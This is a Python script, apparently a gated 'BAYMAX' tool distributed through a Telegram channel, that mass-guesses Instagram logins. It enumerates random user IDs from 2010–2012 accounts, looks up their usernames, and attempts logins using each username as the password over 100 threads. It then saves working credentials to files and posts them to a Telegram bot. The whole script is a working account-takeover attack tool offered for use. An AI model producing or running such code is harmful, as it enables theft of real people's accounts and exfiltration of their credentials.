import requests
import webbrowser
import os
import time
import sys

API_VALIDATE_URL = "https://file-expiry.onrender.com/validate"
TELEGRAM_CHANNEL = "https://t.me/+zl0PPCz77_g0NTU1" 

def check_code():
    user_id = input("ENTER USER ID: ").strip()
    code = input("ENTER KEY : ").strip()
    try:
        resp = requests.get(API_VALIDATE_URL, params={"code": code, "user_id": user_id})
    except requests.RequestException as e:
        print(f" CONNECTION ERROR: {e}")
        return False
    try:
        data = resp.json()
    except ValueError:
        print("SERVER ERROR ")
        return False
    if resp.status_code == 200 and data.get("valid"):
        print(" ACCESS GRANTED! ")
        return True
    else:
        error = data.get("error", "Unknown error")
        print(f" ACCESS DENIED BRO : {error}")
        print(" REDIRECTING TO CHANNEL ...")
        webbrowser.open(TELEGRAM_CHANNEL)
        sys.exit(1)

if __name__ == "__main__":
    if check_code():
        print(" Successfully connected to BAYMAX SERVER ...")
        time.sleep(1)

        import subprocess
        import sys
        import importlib
        import os
        import random
        import string
        import json
        import threading
        from uuid import uuid4
        from concurrent.futures import ThreadPoolExecutor
        from rich.console import Console
        from cfonts import render
        from user_agent import generate_user_agent as uu
        from asmix import Instagram
        from colorama import Fore, init

        init(autoreset=True)

        def show_banner():
            os.system('cls' if os.name == 'nt' else 'clear')
            banner = render('BAYMAX!', colors=['cyan', 'yellow'], align='center', space=False)
            print(banner)
            print(Fore.RED + '=' * 60)
            print(Fore.RED + 'FILE BY @Bayymaxb4601'.center(60))
            print(Fore.RED + '=' * 60)

        show_banner()

        uid = str(uuid4())
        a = 0
        u = 0
        z = 0
        j = 0
        Ex = 0
        Con = Console()

        bot_token = input(f"{Fore.CYAN}[{Fore.YELLOW} ★ {Fore.CYAN}] {Fore.LIGHTWHITE_EX}Token {Fore.RESET}: ")
        chat_id   = input(f"{Fore.CYAN}[{Fore.YELLOW} ★ {Fore.CYAN}] {Fore.LIGHTWHITE_EX}Chat ID {Fore.RESET}: ")

        def generate_userid(year_choice):
            year_ranges = {
                "1": (10000, 1279000),          
                "2": (100000, 1700000),     
                "3": (1279001, 17750001),   
                "4": (17750001, 47750000)  
            }
            min_id, max_id = year_ranges.get(year_choice, (100000, 50000000))
            return str(random.randrange(min_id, max_id))

        print(f"""{Fore.CYAN}[{Fore.YELLOW} ★ {Fore.CYAN}] {Fore.LIGHTWHITE_EX}Select Year Range:
          1) 2010
          2) 2010 - Mar 2011
          3) 2011
          4) 2012
        """)

        year_choice = input(f"{Fore.CYAN}[{Fore.YELLOW} ★ {Fore.CYAN}] {Fore.LIGHTWHITE_EX}Enter option (1-4) {Fore.RESET}: ")

        def send_telegram(msg):
            try:
                url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                payload = {'chat_id': chat_id, 'text': msg}
                requests.post(url, data=payload)
            except Exception as e:
                print(f"Telegram send error: {e}")

        def check(username, pasw):
            global a, u, z, j
            url = 'https://b.i.instagram.com/api/v1/accounts/login/'
            headers = {
                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'
            }
            data = {
                'uuid': uid,
                'password': pasw,
                'username': username,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'
            }

            try:
                rii = requests.post(url, headers=headers, data=data, timeout=15)
                re = rii.text

                if '"logged_in_user"' in re or '"challenge_required"' in re:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    u += 1
                    try:
                        resp_json = json.loads(re)
                    except:
                        pass  
                    with open('2010-2012.txt', 'a') as f:
                        f.write(f'{username}:{pasw}\n')
                    send_telegram(
                        f"🧑‍💻 Valid Account Found!\n"
                        f"User: {username}\n"
                        f"Pass: {pasw}\n"
                        f"Link: https://instagram.com/{username}\n"
                        f"📁 File by @Bayymaxb4601"
                    )
                else:
                    z += 1
                    print(
                        f"Hits: {u} // Bad: {z} // Retries: {j}",
                        end='\r'
                    )
            except Exception as e:
                j += 1
                print(f"[ERROR] check(): {e}")

        def Users():
            global Ex
            try:
                LsD = ''.join(random.choices(string.digits, k=4))
                UseriD = generate_userid(year_choice)
                vars = json.dumps({'id': UseriD, 'render_surface': 'PROFILE'})
                resp = requests.post(
                    'https://www.instagram.com/api/graphql',
                    headers={'X-FB-LSD': LsD},
                    data={'lsd': LsD, 'variables': vars, 'doc_id': '25618261841150840'},
                    timeout=15
                )
                u = resp.json()['data']['user']['username']
                Ex += 1
                open('2k1012hits.txt', 'a').write(f"{u}:{u}\n")
                check(u, u)
            except:
                pass    

        threads = []
        for _ in range(100):
            t = threading.Thread(target=lambda: [Users() for _ in range(1000)])
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
